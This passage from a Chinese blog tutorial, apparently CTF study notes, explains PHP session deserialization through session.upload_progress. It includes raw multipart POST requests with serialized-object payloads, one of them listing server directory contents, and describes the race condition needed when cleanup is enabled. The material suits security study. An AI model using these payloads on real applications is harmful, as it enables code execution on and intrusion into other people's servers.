<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>

<p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>

<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
<h6 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h6><p><strong>同样需要php≥5.4</strong></p>
<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，<u>表示当文件上传结束后，php将会立即清空对应session文件中的内容</u>，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
<p>开始解析：</p>
<p>1. </p>
<ul>
<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
</ul>
<p>脚本等我后面再补上，有佬有的话求</p>
<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
<p>其他例题参考：<br>1.简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
]]></content>
      <categories>
        <category>php反序列化</category>
        <category>session反序列化</category>
      </categories>
  </entry>
</search>
